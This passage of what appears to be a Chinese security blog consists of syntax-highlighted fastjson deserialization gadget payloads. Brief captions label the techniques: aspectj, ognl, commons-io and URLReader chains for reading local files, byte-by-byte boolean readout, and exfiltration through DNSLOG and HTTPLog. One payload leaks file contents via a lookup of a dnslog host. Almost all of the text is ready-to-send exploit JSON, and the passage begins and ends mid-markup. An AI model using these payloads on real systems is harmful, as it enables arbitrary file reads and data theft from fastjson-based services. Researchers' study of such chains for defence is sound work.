class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Locale&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>         <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;newAnnotationProcessorUnits&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br>   <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>         <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;</span><span class="hljs-punctuation">,</span><br>         <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;</span><span class="hljs-punctuation">,</span><br>         <span class="hljs-attr">&quot;fileName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaa&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>   <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p>aspectj + ognl 文件读取加 DNSLOG 回显</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;fileName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/Users/su18/Downloads/1.txt&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Locale&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Locale&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;language&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;country&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aw.su18.dnslog.pw&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>commons-io + ognl + URLReader 单字节文件读取（回显情况观察数值）</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su14&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ognl.OgnlException&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;su15&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ognl.OgnlException&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;_evaluation&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;su16&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>   <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.Evaluation&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-attr">&quot;node&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.ASTMethod&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;p&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>           <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.OgnlParser&quot;</span><span class="hljs-punctuation">,</span>           <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;file:///Users/su18/Downloads/1.txt&quot;</span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-number">98</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;su17&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.su16.node.p.stream&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;su18&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.su17.bOM.bytes&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>commons-io + ognl + URLReader 单字节文件读取（报错布尔）</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su15&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ognl.OgnlException&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su16&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ognl.OgnlException&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;_evaluation&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su17&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>   <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.Evaluation&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-attr">&quot;node&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.ASTMethod&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;p&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>           <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.OgnlParser&quot;</span><span class="hljs-punctuation">,</span>           <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;file:///Users/su18/Downloads/1.txt&quot;</span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-number">98</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su18&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$[2].su17.node.p.stream&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su19&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$[3].su18.bOM.bytes&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su20&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>   <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.Evaluation&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-attr">&quot;node&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.ASTMethod&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;p&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>           <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.OgnlParser&quot;</span><span class="hljs-punctuation">,</span>           <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>     <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span>     <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="hljs-punctuation">,</span><br>              <span class="hljs-attr">&quot;charSequence&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$[4].su19&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;start&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;end&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su21&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$[5].su20.node.p.stream&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p>commons-io + ognl + URLReader 单字节文件读取 HTTPLog 布尔回显（错误的时候有 log，正确时 无 log)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su15&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ognl.OgnlException&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su16&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ognl.OgnlException&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;_evaluation&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su17&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>   <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.Evaluation&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-attr">&quot;node&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.ASTMethod&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;p&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>           <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.OgnlParser&quot;</span><span class="hljs-punctuation">,</span>           <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;file:///Users/su18/Downloads/1.txt&quot;</span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-number">98</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su18&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$[2].su17.node.p.stream&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su19&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$[3].su18.bOM.bytes&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su22&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>   <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.Evaluation&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-attr">&quot;node&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>       <span class="hljs-attr">&quot;@type&quot;</span><span 